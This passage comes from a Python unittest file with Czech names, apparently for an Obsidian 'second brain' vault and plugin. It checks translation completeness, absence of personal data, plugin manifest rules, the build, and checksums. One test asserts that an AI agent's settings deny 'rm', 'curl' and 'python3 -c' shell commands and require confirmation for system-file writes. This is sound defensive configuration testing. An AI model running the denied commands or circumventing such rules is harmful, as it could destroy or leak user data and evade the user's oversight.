        cs = json.loads((ZDROJ / "_Systém/jazyky/cs.json").read_text())["soubory"]
        for j in self.JAZYKY[1:]:
            b = json.loads((ZDROJ / f"_Systém/jazyky/{j}.json").read_text())["soubory"]
            for rel in cs:
                if rel.endswith(".md"):
                    self.assertEqual(klice(b[rel]), klice(cs[rel]), f"{j}: {rel}")

    def test_texty_skriptu_kompletni(self):
        texty = json.loads((ZDROJ / "_Systém/texty.json").read_text())
        for j in self.JAZYKY:
            self.assertEqual(set(texty[j]), set(texty["cs"]), j)
            for k, v in texty[j].items():
                self.assertEqual(sorted(re.findall(r"\{\w*\}", v)), sorted(re.findall(r"\{\w*\}", texty["cs"][k])), f"{j}.{k}")

    def test_preklady_rozsireni_kompletni(self):
        js = (self.ROZSIRENI / "main.js").read_text()
        klice = {json.loads(f'"{m}"') for m in re.findall(r'\b(?:T|bod)\(\s*"((?:[^"\\]|\\.)*)"', js)}
        preklady = json.loads((self.ROZSIRENI / "preklady.json").read_text())
        self.assertEqual(set(preklady), set(self.JAZYKY) - {"cs"})
        for j, slovnik in preklady.items():
            self.assertEqual(klice - set(slovnik), set(), f"{j}: chybí překlady")
            for k, v in slovnik.items():
                self.assertEqual(sorted(re.findall(r"\{\d\}", v)), sorted(re.findall(r"\{\d\}", k)), f"{j}: {k}")


class Repozitar(unittest.TestCase):
    def test_bez_osobnich_udaju(self):
        self.assertFalse((ZDROJ / "_Systém/nastaveni.json").exists(), "nastaveni.json nesmí být v repozitáři")
        for p in REPO.rglob("*"):
            if p.is_file() and ".git" not in p.parts and p.suffix in (".md", ".py", ".js", ".json", ".css", ".base", ".command", ".txt", ".yml"):
                if p.name == "test_system.py":
                    continue
                text = p.read_text(errors="ignore")
                self.assertIsNone(re.search(r"\b\d{6}@mail\.muni\.cz|\b\d{6}-[A-ZÁ-Ž][a-zá-ž]+ [A-ZÁ-Ž]", text), f"osobní údaj v {p}")

    def test_opravneni_ai(self):
        """AI nesmí do zálohy z aktualizace a systémová data mění jen s potvrzením."""
        o = json.loads((ZDROJ / ".claude/settings.json").read_text())["permissions"]
        for r in ("Edit(.druhy-mozek-zaloha/**)", "Write(.druhy-mozek-zaloha/**)", "Bash(rm:*)", "Bash(curl:*)", "Bash(python3 -c:*)"):
            self.assertIn(r, o["deny"])
        for r in ("Write(_Systém/**/*.json)", "Write(_Systém/**/*.base)", "Write(_Systém/**/*.py)", "Write(.obsidian/**)", "Write(.claude/**)"):
            self.assertIn(r, o["ask"])
        self.assertEqual(o.get("disableBypassPermissionsMode"), "disable")

    def test_rozsireni_pro_adresar_obsidianu(self):
        """Verze pro community.obsidian.md: sestavení, manifest v kořeni, pravidla adresáře."""
        roz = ZDROJ / ".obsidian/plugins/druhy-mozek"
        manifest = json.loads((roz / "manifest.json").read_text())
        self.assertEqual((REPO / "manifest.json").read_bytes(), (roz / "manifest.json").read_bytes(), "manifest.json v kořeni = manifest rozšíření")
        self.assertEqual(json.loads((REPO / "versions.json").read_text()).get(manifest["version"]), manifest["minAppVersion"])
        self.assertNotIn("obsidian", manifest["id"])
        self.assertTrue(manifest["description"].endswith(".") and "Obsidian" not in manifest["description"] and len(manifest["description"]) <= 250)
        self.assertTrue(manifest["isDesktopOnly"], "rozšíření používá Node (soubory, Python) – jen desktop")
        js = (roz / "main.js").read_text()
        for zakazane in ("innerHTML", "outerHTML", "insertAdjacentHTML", ".style.", "console.log", 'createEl("h1"', 'createEl("h2"', 'createEl("h3"', "hotkeys:"):
            self.assertNotIn(zakazane, js, f"pravidla Obsidianu: {zakazane}")
        with tempfile.TemporaryDirectory() as d:
            kopie = Path(d) / "repo"
            shutil.copytree(REPO, kopie, ignore=shutil.ignore_patterns(".git", "__pycache__", "dist"))
            r = subprocess.run([sys.executable, str(kopie / "nastroje/sestav_rozsireni.py")], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            vystup = (kopie / "dist/main.js").read_text()
            self.assertIn('const DISTRIBUCE = "obsidian";', vystup)
            self.assertNotIn("const BALIK = null;", vystup)
            self.assertTrue((kopie / "dist/manifest.json").exists() and (kopie / "dist/styles.css").exists())
            balik = json.loads(vystup.split("const BALIK = ", 1)[1].split(";\n", 1)[0])
            self.assertEqual(balik["verze"], manifest["version"])
            self.assertIn("_Systém/prehledy.py", balik["soubory"])
            self.assertIn("en", balik["preklady"])
            self.assertFalse(any(r.startswith(".obsidian/plugins/druhy-mozek/") for r in balik["soubory"]), "rozšíření samo dodá Obsidian")

    def test_adresa_pro_hlaseni(self):
        """Hlášení chyb musí mít skutečnou adresu (zástupná example.invalid by hlášení zahodila)."""
        js = (ZDROJ / ".obsidian/plugins/druhy-mozek/main.js").read_text()
        adresa = re.search(r'const HLASENI_EMAIL = "([^"]+)"', js).group(1)
        self.assertRegex(adresa, r"^[\w.+-]+@[\w-]+(\.[\w-]+)+$")
        for p in [REPO / "README.md", REPO / "SECURITY.md", *(REPO / "docs").glob("*.md"), ZDROJ / ".obsidian/plugins/druhy-mozek/main.js"]:
            self.assertFalse("example.invalid" in p.read_text(), f"zástupná adresa v {p.name} – doplň skutečnou adresu pro hlášení")

    def test_kontrolni_soucty(self):
        r = subprocess.run([sys.executable, str(REPO / "nastroje/kontrolni_soucty.py"), "--kontrola"],
                           capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
